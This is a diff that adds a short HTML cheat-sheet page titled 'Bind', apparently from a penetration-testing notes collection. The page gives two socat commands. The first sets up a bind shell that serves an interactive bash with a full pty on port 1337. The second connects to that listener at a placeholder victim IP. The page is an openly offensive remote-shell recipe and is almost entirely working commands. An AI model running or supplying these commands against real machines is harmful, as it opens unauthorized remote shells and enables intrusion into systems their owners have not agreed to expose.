@@ -1,0 +1,12 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bind</title>
+</head><body>Bind shell<br/>
+<br/>
+Set listener:<br/>
+socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane<br/>
+<br/>
+Connect to the listener:<br/>
+socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337</body></html>
